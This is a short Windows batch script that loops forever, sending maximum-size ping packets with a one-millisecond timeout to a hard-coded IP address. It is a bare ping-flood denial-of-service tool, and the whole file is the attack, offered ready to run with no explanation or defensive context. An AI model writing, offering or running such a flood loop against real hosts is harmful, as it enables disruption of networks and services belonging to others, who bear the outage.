@echo off
:loop

ping 5.252.229.74 -l 65500 -w 1 -n 1
goto :loop